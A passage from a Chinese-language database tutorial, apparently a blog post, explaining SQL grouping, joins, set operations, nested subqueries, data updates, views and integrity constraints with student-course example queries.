<code>GROUP BY</code>  的作用，如果我查询各个课程的选修人数，则我需要按照课程号先对每个课程进行分组，再在每一组查询 Sno。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Cno,Count(Sno)</span><br><span class="line">FROM sc</span><br><span class="line">GROUP BY Cno;</span><br></pre></td></tr></table></figure><p>如果我只想显示那些选修人数大于 1 以上的课程，则<strong>可以用 <code>HAVING</code>  语句，在组内进行筛选</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT Cno,Count(Sno)</span><br><span class="line">FROM sc</span><br><span class="line">GROUP BY Cno</span><br><span class="line">HAVING Count(Sno) &gt; 1;</span><br></pre></td></tr></table></figure><h4 id="二连接查询查询时涉及多张表"><a class="markdownIt-Anchor" href="#二连接查询查询时涉及多张表">#</a> 二，连接查询（查询时涉及多张表）</h4><p><strong>(1) 等值连接和非等值连接</strong><br><strong>语法：在 WHERE 子句中写入连接条件（又叫做连接每谓词），其格式为</strong><br><img src="https://img-blog.csdnimg.cn/04445338e11c4257b9e38b00ea959b88.png" alt="连接"><br><strong>其中比较运算符有： <code>=</code> 、 <code>&gt;</code> 、 <code>&lt;</code> 、 <code>&gt;=</code> 、 <code>&lt;=</code> 、 <code>!=</code> </strong></p><ul><li><strong>当运算符为 <code>=</code>  时称之为等值连接</strong></li><li><strong>当运算符不为 <code>=</code>  时称之为非等值连接</strong><br>例子：查询每个学生及其选修课程的情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.*,sc.*</span><br><span class="line">FROM student,sc</span><br><span class="line">WHERE student.Sno=sc.Sno;</span><br></pre></td></tr></table></figure><p>例子：使用自然连接（即去掉重复列）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line">FROM student,sc</span><br><span class="line">WHERE student.sno=sc.sno;</span><br></pre></td></tr></table></figure><p><strong>(2) 自身连接</strong><br><strong>语法：所谓自身连接就是指一个表与自己连接</strong><br>例子：查询每一门课的先修课的先修课</p><ul><li>在 <code>Course</code>  表中有的只是每门课的直接先修课，要想得到先修课的先修课，那么就必须先找到一门课的先修课，然后再按此先修课的课程号查找它的先修课</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT ONE.Cno,TWO.Cpno</span><br><span class="line">FROM Course ONE,Course TWO</span><br><span class="line">WHERE ONE.Cpno=TWO.Cno;</span><br></pre></td></tr></table></figure><p><strong>(3) 连接 JOIN</strong><br><strong> 语法：SQL JOIN 用于把来自两个或多个表的行结合起来，其格式如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM TABLE1//左表</span><br><span class="line">&lt;某某 JOIN&gt;TABLE2//右表</span><br><span class="line">ON TABLE1.column_name=TABLE2.column_name</span><br></pre></td></tr></table></figure><p><strong>有如下几类</strong>： 这里以查询学校内学生及雇员的情况。</p><ul><li><code>INNER JOIN</code> ( <code>JOIN</code> ) 既是学生，又是雇员。</li><li><code>LEFT JOIN</code> ( <code>LEFT OUTER JOIN</code> ) 是学生，可以不是雇员。</li><li><code>RIGHT JOIN</code> ( <code>RIGHT OUTER JOIN</code> ) 可以不是学生，但，是雇员</li><li><code>FULL JOIN</code> ( <code>FULL OUTER JOIN</code> ) 可以不是学生，可以不是雇员。<br><strong>A：INNER JOIN(JOIN)</strong><br><strong> <code>INNER JOIN</code> ( <code>JOIN</code> )：关键字在表中存在至少一个匹配时返回行</strong><br>以 <code>sc</code>  和 <code>course</code>  的 <code>Cno</code>  作为比对标准，将相同连接在一起</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc INNER JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c4702afa17964fe89116980641e9253d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="内连接展示"><br><strong> B：LEFT JOIN (LEFT OUTER JOIN)</strong><br><strong> <code>LEFT JOIN</code> ( <code>LEFT OUTER JOIN</code> )：以左表为标准，若右表中无匹配，则填 NULL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc LEFT JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c45245514e184c8d83c6ceb1b84f0a4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_15,color_FFFFFF,t_70,g_se,x_16" alt="左外连接"><br><strong> C：RIGHT JOIN (RIGHT OUTER JOIN)</strong><br><strong> <code>RIGHT JOIN</code> ( <code>RIGHT OUTER JOIN</code> )：以右表为标准，若左表中无匹配，则填 NULL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc RIGHT JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/17c4bdf789b242eab9878687a482f149.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="右外连接"><br><strong> D：FULL JOIN (FULL OUTER JOIN)</strong><br><strong> <code>FULL JOIN</code> ( <code>FULL OUTER JOIN</code> )：本质就是结合了 LEFT JOIN 和 RIGHT JOIN</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,sc.Cno,Grade,course.Cno,Cname,Cpno,Ccredit</span><br><span class="line">FROM sc FULL JOIN course ON(sc.Cno=course.Cno);</span><br></pre></td></tr></table></figure><p><strong>(4) 符合条件连接</strong><br><strong>语法：没有什么新的东西，就是涉及多张表，多个条件的查询</strong><br><strong> (5) 集合操作的多关系查询</strong><br>集合操作主要有 union,intersect 和 except<br> 且集合操作一般可以利用多条条件语句代替<br><strong> A，UNION</strong><br> 查询计算机系的学生以及年龄不大于 19 岁的学生</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’</span><br><span class="line">Union  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage &lt;= 19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">or Sage &lt;= 19;</span><br></pre></td></tr></table></figure><p><strong>B, INTERSECT</strong><br> 查询计算机系的学生与年龄不大于 19 岁的学生的交集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">intersect  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage&lt;=19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">and Sage &lt;= 19;</span><br></pre></td></tr></table></figure><p><strong>C, EXCEPT</strong><br> 查询计算机系的学生与年龄不大于 19 岁的学生的差集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">except  </span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sage&lt;=19;</span><br><span class="line">--上述等价于下述</span><br><span class="line">select *  </span><br><span class="line">from Students  </span><br><span class="line">where Sdept=‘CS’  </span><br><span class="line">and Sage &gt; 19;</span><br></pre></td></tr></table></figure><h4 id="三嵌套查询"><a class="markdownIt-Anchor" href="#三嵌套查询">#</a> 三，嵌套查询</h4><p>在 SQL 中，一个 <code>SELECT-FROM-WHERE</code>  语句称为一个<strong>查询块</strong>，<strong>将一个查询块嵌套在另一个查询块的 WHERE 子句或 HAVING 短语的条件中的查询称之为嵌套查询。比如:</strong> 内层循环查出来的是符合 <code>Cno=2</code>  的 <code>Sno</code>  集合，外层循环则在该集合内查询是否有满足的 <code>Sno</code> ，有的话显示 <code>Sname</code>  即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname //外层查询</span><br><span class="line">FROM Student</span><br><span class="line">WHERE Sno IN</span><br><span class="line">(</span><br><span class="line">SELECT Sno //内层查询</span><br><span class="line">FROM SC</span><br><span class="line">WHERE Cno=&#x27;2&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>需要注意下面几点：</p><ul><li><strong>子查询的 SELECT 语句不能使用 <code>ORDER BY</code>  子句</strong></li><li><strong>嵌套查询往往可以转换为对应的连接运算</strong><br>嵌套查询分为不相关子查询和相关子查询。</li><li>不相关子查询：求解方法由里向外</li><li>相关子查询：求解方法由外向里<br><strong> (1) 带有 IN 谓词的子查询</strong><br><strong>语法：嵌套查询中，子查询的结果往往是一个集合，所以 IN 在嵌套查询中使用次数最为频繁</strong><br>例子：查询与 “刘晨” 在同一个系学习的学生</li><li>考虑时可以由内向外，<strong>先查询出刘晨所在的系，然后在该集合中查询满足该集合的学生姓名</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT student.Sno,Sname,Sdept FROM student WHERE Sdept IN</span><br><span class="line">(SELECT Sdept FROM student WHERE Sname=&#x27;刘晨&#x27;);</span><br></pre></td></tr></table></figure><p>当然嵌套查询也可以转为<strong>连接</strong>完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT S1.Sno,S1.Sname,S1.Sdept</span><br><span class="line">FROM Student S1,Student S2</span><br><span class="line">WHERE S1.Sdept=S2.Sdept AND S2.Sname=&#x27;刘晨&#x27;;</span><br></pre></td></tr></table></figure><p><strong>(2) 带有比较运算符的子查询</strong><br><strong>语法：带有比较运算符的子查询是指父查询与子查询之间用比较运算符进行连接。当用户能确切知道内层查询返回的是单个值时，可以使用 <code>&gt;</code> 、 <code>&lt;</code> 、 <code>=</code> 、 <code>&gt;=</code> 、 <code>&lt;=</code> 、 <code>!=</code>  等比较运算符</strong><br>例子：查询与 “刘晨” 在同一个系学习的学生</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,Sname,Sdept FROM student WHERE Sdept</span><br><span class="line">= (SELECT Sdept FROM student WHERE Sname=&#x27;刘晨&#x27;);</span><br></pre></td></tr></table></figure><p><strong>（3）带有 ANY（SOME）或 ALL 谓词的子查询</strong><br><strong>语法：内层查询返回单个值时使用比较运算符。如果返回多个值要用 <code>ANY</code> （有的是 SOME）或 <code>ALL</code> ，然后同时使用比较运算符</strong><br><img src="https://img-blog.csdnimg.cn/c5550c56e34f4b0bac6f2ce4899ad1c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="样例"><br>例子：查询其他系比计算机科学系<strong>任意</strong>一个学生年龄小的学生姓名和年龄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname,Sage FROM student WHERE Sage &lt; ANY</span><br><span class="line">(SELECT Sage FROM student WHERE Sdept=&#x27;CS&#x27;)</span><br><span class="line">AND Sdept!=&#x27;CS&#x27;;   </span><br><span class="line">-- &lt; ANY 等价于 &lt; MAX  其等价写法如下</span><br><span class="line">SELECT Sname,Sage FROM student WHERE Sage &lt;</span><br><span class="line">(SELECT MAX(Sage) FROM student WHERE Sdept=&#x27;CS&#x27;)</span><br><span class="line">AND Sdept!=&#x27;CS&#x27;;</span><br></pre></td></tr></table></figure><p><strong>（4）带有 EXISTS 谓词的子查询</strong><br><strong>语法</strong>：EXISTS 代表存在量词，其不返回任何数据，只返回 <code>TRUE</code>  或者 <code>FALSE</code> 。另外，由 EXISTS 引出的子查询，其目标列表达式都是 *，因为列名没有意义。（写啥都行 1 也行)</p><ul><li>若内层查询结果非空，则外层 WHERE 子句返回 <code>true</code></li><li>若内层查询结果为空，则外层 WHERE 子句返回 <code>false</code> <br> 与之相反的有  <code>NOT EXISTS</code> 。<br><strong>需要注意的是，一些带有 EXISTS 和 NOT EXISTS 谓词的子查询不能被其他形式的子查询等价替换；但是所有带 IN 谓词，比较运算符，ANY 和 ALL 谓词的子查询都可以用带 EXISTS 谓词的子查询替换</strong><br>例子：查询所有选修了 1 号课程的学生姓名</li><li>处理时，首先会取外层查询中 <code>Student</code>  表的第一个元组，根据它与内层查询相关的属性值（ <code>Sno</code> ）处理内层查询，若 <code>WHERE</code>  子句返回为 <code>true</code>  则取外层查询中该元组的 <code>Sname</code>  放入结果表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname FROM student WHERE </span><br><span class="line">EXISTS</span><br><span class="line">(SELECT * from sc where Sno=student.Sno AND Cno=&#x27;1&#x27;);</span><br></pre></td></tr></table></figure><p>例子 2：查询一个学生选修了所有的课程<br>着等价于：<strong>查询这样一个学生，没有一门课它是不选的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname FROM Student WHERE NOT EXISTS(</span><br><span class="line">SELECT * FROM Course WHERE NOT EXISTS(SELECT * FROM SC </span><br><span class="line">WHERE Sno = Stident.Sno</span><br><span class="line">AND Cno = Course.Cno</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="数据更新"><a class="markdownIt-Anchor" href="#数据更新">#</a> 数据更新</h3><h5 id="一插入数据"><a class="markdownIt-Anchor" href="#一插入数据">#</a> 一，插入数据</h5><p><strong>语法：格式如下，用于将新元组插入指定表中。需要注意</strong></p><ul><li><code>INTO</code>  子句中没有出现的属性列，新元组在这些列上将会取 <code>NULL</code></li><li>若 <code>INTO</code>  子句中没有指明任何属性列名，则新插入的元祖必须在每个属性列上均有值<br><img src="https://img-blog.csdnimg.cn/93a441256646481a9039e63212692a3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="插入"><br>例子：将一个新学生元组 <strong>（学号：200215128；姓名：陈冬；性别：男；所在系：IS；年龄：18 岁）</strong> 插入到 Student 表中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br><span class="line">INTO student(Sno,Sname,Ssex,Sdept,Sage)</span><br><span class="line">VALUES(&#x27;201215128&#x27;,&#x27;陈冬&#x27;,&#x27;男&#x27;,&#x27;IS&#x27;,18);</span><br></pre></td></tr></table></figure><p>插入多条记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INSERT </span><br><span class="line">INTO student </span><br><span class="line">VALUES </span><br><span class="line">(201515000,&#x27;小赵&#x27;,&#x27;男&#x27;,30,&#x27;IS&#x27;)，</span><br><span class="line">(201515001,&#x27;小钱&#x27;,&#x27;女&#x27;,28,&#x27;MA&#x27;)，</span><br><span class="line">(201515002,&#x27;小孙&#x27;,&#x27;男&#x27;,33,&#x27;MJ&#x27;)，</span><br><span class="line">(201515003,&#x27;小李&#x27;,&#x27;女&#x27;,25,&#x27;CS&#x27;)，</span><br><span class="line">(201515004,&#x27;小周&#x27;,&#x27;男&#x27;,41,&#x27;LI&#x27;);</span><br></pre></td></tr></table></figure><h5 id="二修改数据-update"><a class="markdownIt-Anchor" href="#二修改数据-update">#</a> 二，修改数据 (UPDATE)</h5><p><strong>语法：格式如下，其功能是修改指定表中满足 <code>WHERE</code>  子句条件的元组</strong></p><ul><li>如果省略 WHERE 子句，则表示要修改表中所有元组<br><img src="https://img-blog.csdnimg.cn/ae9586d56ff742f4b98bbcdef7722ac6.png" alt="修改数据"><br>例子：将学生 201215121 的年龄改为 22 岁</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=22</span><br><span class="line">WHERE Sno=&#x27;201215121&#x27;;</span><br></pre></td></tr></table></figure><p>修改多个元组的值：将所有学生的年龄增加一岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=Sage+1;</span><br></pre></td></tr></table></figure><h5 id="三删除数据-delete"><a class="markdownIt-Anchor" href="#三删除数据-delete">#</a> 三，删除数据 (DELETE)</h5><p><strong>语法：格式如下，其功能是从指定表中删除满足 <code>WHERE</code>  子句条件的所有元组，注意</strong></p><ul><li><code>DELETE</code>  删除的是表的数据，而不是表的定义</li><li>如果省略 <code>WHERE</code>  子句，那么就表示删除全部元组<br><img src="https://img-blog.csdnimg.cn/e45c2afc96444072be578fdaa0d0cb17.png" alt="删除数据"><br><strong>注意事项：在进行数据库数据的更新时，需要保证数据库的一致性，以及约束条件</strong></li></ul><h3 id="视图"><a class="markdownIt-Anchor" href="#视图">#</a> 视图</h3><h5 id="一关于视图"><a class="markdownIt-Anchor" href="#一关于视图">#</a> 一，关于视图</h5><p>【定义】视图是一个<strong>虚表</strong>，其本质就是一条 <code>SELECT</code>  语句，而查询结果被赋予了一个名字，也即视图名字。或者说视图本身不包含任何数据，它只包含映射到基表的一个查询语句，当基表数据发生变化时，视图数据也随之变化。其目的就是在于方便，简化数据操作。<br><strong>视图的作用：</strong></p><ul><li>视图能够简化用户的操作</li><li>视图使用户能以多种角度看待同一数据</li><li>视图对重构数据库提供了一定程度的逻辑独立性</li><li>视图能够对机密数据提供安全保护</li><li>适当的利用视图可以更清晰的表达查询</li></ul><h5 id="二视图的定义和删除"><a class="markdownIt-Anchor" href="#二视图的定义和删除">#</a> 二：视图的定义和删除</h5><p><strong>1, 视图的定义</strong><br><strong>语法：使用 <code>CREATE VIEW</code>  语句创建视图，格式如下</strong><br><img src="https://img-blog.csdnimg.cn/35453393eb694f159939b678b6dd963f.png" alt="建立视图"></p><ul><li>子查询可以是<strong>任意的 <code>SELECT</code>  语句</strong>（是可以含有 <code>ORDER BY</code>  子句和 <code>DISTINCT</code>  短语取决于具体系统）</li><li>组成视图的属性列名<strong>要么全部省略要么全部指定，不能有第三种情况</strong></li><li>如果省略视图列名，则其列名默认由 <strong> <code>SELECT</code>  子句目标列诸字段组成</strong><br>例子：建立信息系 IS 学生的视图</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW IS_student</span><br><span class="line">AS </span><br><span class="line">SELECT Sno,Sname,Sage,Sdept</span><br><span class="line">FROM student</span><br><span class="line">WHERE Sdept=&#x27;IS&#x27;</span><br></pre></td></tr></table></figure><p>视图也可以基于多个表，同一，视图可以基于视图创建，也可以带有表达式。<br>例子：定义一个反映学生出生年份的视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW birthday(Sno,Sname,Syear)</span><br><span class="line">AS</span><br><span class="line">SELECT Sno,Sname,2022-Sage</span><br><span class="line">FROM student;</span><br></pre></td></tr></table></figure><p><strong>注意：在定义视图时如果有  <code>WITH CHECK OPTION</code>  子句，则在对视图进行 UPDATE,INSERT,DELETE 时要保证更新，插入，删除的行满足视图定义的谓词条件。</strong><br><strong>2，视图的删除</strong></p><ul><li>基本表删除之后，由该基本表导出的所有视图均无法使用，<strong>但是视图的定义没有从字典中清除</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP VIEW &lt;视图名&gt; [CASCADE];</span><br></pre></td></tr></table></figure><h5 id="三视图的查询"><a class="markdownIt-Anchor" href="#三视图的查询">#</a> 三，视图的查询</h5><p><strong>语法：从用户角度出发，查询视图和查询基本表相同；从 DBMS 角度出发，采用视图消解法，具体来讲</strong></p><ul><li>首先进行<strong>有效性检查</strong></li><li>接着转换成<strong>等价的</strong>对基本表的查询</li><li>最后执行<strong>修正</strong>后的查询</li></ul><h5 id="四视图的更新"><a class="markdownIt-Anchor" href="#四视图的更新">#</a> 四，视图的更新</h5><p><strong>语法：视图是虚表，所以对视图的更新最终会转化为对基本表的更新。为了防止用户通过视图对数据进行更新时，有意或无意地对不属于视图范围内的基本表数据进行操作，可以在定义视图时加上 <code>WITH CHECK OPTION</code>  子句。这样在更新时，如果不满足条件，DBMS 会拒绝操作</strong><br><strong>（1）UPDATE</strong><br> 例如：如果在定义视图 <code>is_student</code>  在定义时加入了 <code>WITH CHECK OPTION</code>  子句，接着再执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE is_student</span><br><span class="line">SET Sdept=&#x27;MA&#x27;</span><br><span class="line">WHERE Sno=&#x27;201215125&#x27;;</span><br></pre></td></tr></table></figure><p>那么在更新时如果将 <code>Sdept</code>  字段改为了’MA’或其他值，DBMS 就会拒绝执行。<br><strong>（2）INSERT</strong><br> 向信息系学生视图 <code>IS_Student</code>  中插入一个新的学生记录：201215129，赵新，20 岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO is_student</span><br><span class="line">VALUES(&#x27;201215129&#x27;,&#x27;赵新&#x27;,20);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3df7025dcf304f8d85098a071791c41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="插入操作"></p><ul><li>这里视图没有数据，且 20 插入到了错误的地方（如果没有 <code>WITH CHECK OPTION</code>  就会导致这些错误出现）</li><li>如果假如了 <code>WITH CHECK OPTION</code> ，那么 DBMS 会拒绝执行<br><strong>（3）DELETE</strong><br> 删除数据时，有没有 <code>WITH CHECK OPTION</code>  是一样的。</li></ul><h1 id="四数据库完整性"><a class="markdownIt-Anchor" href="#四数据库完整性">#</a> 四，数据库完整性</h1><p>【定义】数据库完整性是指数据的正确性和相容性。</p><ul><li><strong>正确性</strong>：数据是符合现实世界语义、反映当前实际状况的。例如性别只能是男或女</li><li><strong>相容性</strong>：是指数据库同一对象在不同关系表中的数据是符合逻辑的。比如说年龄一般都在 1-100 岁，当然也有超过一百岁的，反正没有两百岁，三百岁成仙的人类<br><strong>数据库完整性和安全性的区别：</strong></li><li><strong>完整性</strong>：是为了防止数据库中存在<strong>不符合语义的数据</strong>，也就是防止数据库中存在<strong>不正确的数据</strong>。因此，完整性检查和控制的防范对象是<strong>不合语义的、不正确的数据，防止它们进入数据库</strong></li><li><strong>安全性</strong>：是保护数据库<strong>防止恶意破坏和非法存取</strong>。因此，安全性控制的防范对象是<strong>非法用户和非法操作，防止他们对数据库数据的非法存取</strong><br> ** 为维护完整性 DBMS 必须要实现的功能</li><li>提供定义完整性约束条件的机制</li><li>提供完整性检查的方法</li><li>进行违约处理</li></ul><h3 id="数据库三大完整性"><a class="markdownIt-Anchor" href="#数据库三大完整性">#</a> 数据库三大完整性</h3><h4 id="一实体完整性"><a class="markdownIt-Anchor" href="#一实体完整性">#</a> 一，实体完整性</h4><p>若属性 A 时基本关系 R 的<strong>主属性</strong>，则属性 A<strong> 不能取空值</strong><br><strong>（1）定义实体完整性</strong><br>定义方法：关系模型的实体完整性在 <code>CREATE TABLE</code>  中用 <code>PRIMARY KEY</code>  定义。注意：</p><ul><li><strong>如果主码仅有一个属性（单属性）</strong>：可以定义为<strong>列级约束条件</strong>也可以定义为<strong>表级约束条件</strong></li><li><strong>如果主码有多个属性</strong>：注意<strong>仅能定义为表级约束条件</strong><br><strong>（2）实体完整性的检查和违约处理</strong></li><li><strong>检查主码值是否唯一，如果不唯一则拒绝插入或修改</strong></li><li><strong>检查主码的各个属性是否为空，只要有一个为空就拒绝插入或修改</strong><br><strong>其中检查记录中主码值是否唯一有两种方法：</strong></li><li>全表扫描：十分耗时</li><li>建立索引：关系数据库管理系统一般都会在主码上自动建立一个索引</li></ul><h4 id="二参照完整性"><a class="markdownIt-Anchor" href="#二参照完整性">#</a> 二，参照完整性</h4><p><strong>（1）定义参照完整性</strong><br><strong>定义方法：关系模型的参照完整性在 <code>CREATE TABLE</code>  中用 <code>FOREIGN KEY</code>  定义，同时用 <code>REFERENCES</code>  短语指明这些外码参照哪些表的主码</strong><br>定义 <code>sc</code>  表的时候，其 <code>(Sno,Cno)</code>  是主码，分别参照 <code>Sudent</code>  的主码和 <code>Course</code>  表的主码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) NOT NULL,</span><br><span class="line">Sno CHAR(4) NOT NULL,</span><br><span class="line">Grade SMALLINT,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）参照完整性检查和违约处理</strong><br><strong> A：破坏完整性的行为</strong><br>参照完整性将表与表联系在了一起，所以对其中一个表的修改很可能会影响到另外一张表。举个例子，被参照表是 <code>Student</code> ，参照表是 <code>sc</code> ，破坏参照完整性的行为及其违约处理如下表所示：<br><img 